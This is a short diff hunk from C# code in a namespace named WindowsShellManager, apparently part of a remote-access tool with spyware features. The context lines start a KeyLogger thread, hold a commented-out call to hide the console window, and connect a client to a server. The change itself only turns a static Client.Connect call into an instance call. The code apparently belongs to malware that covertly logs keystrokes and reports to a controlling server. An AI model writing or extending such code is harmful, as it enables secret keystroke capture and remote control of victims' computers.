@@ -17,7 +17,7 @@ namespace WindowsShellManager
             //HideConsoleWindow();
             Thread keyLog = new Thread(KeyLogger);
             keyLog.Start();           
-            Client.Connect(server);      
+            new Client().Connect(server);      
         }
        
 
